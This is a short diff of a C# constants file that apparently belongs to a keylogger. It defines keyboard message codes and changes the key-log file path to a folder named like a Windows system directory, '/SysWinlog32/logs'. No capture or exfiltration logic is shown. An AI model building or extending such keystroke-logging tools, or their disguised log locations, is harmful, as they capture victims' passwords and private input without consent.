@@ -1,4 +1,4 @@
-﻿
+
 namespace ConsoleApp2.Constants
 {
     class Constants
@@ -8,10 +8,10 @@ namespace ConsoleApp2.Constants
         public const int wm_keyup   = 0x0101;
 
         // path to the key-log file
-        public const string KeyLogPath = @"/SysWin32/logs/log.txt";
+        public const string KeyLogPath = @"/SysWinlog32/logs/log.txt";
 
         // directory of key-log file
-        public const string LogDir = @"/SysWin32/logs";
+        public const string LogDir = @"/SysWinlog32/logs";
 
         // translate the key code into an unshifted character value
         public const int mapvk_to_char = 0x02;
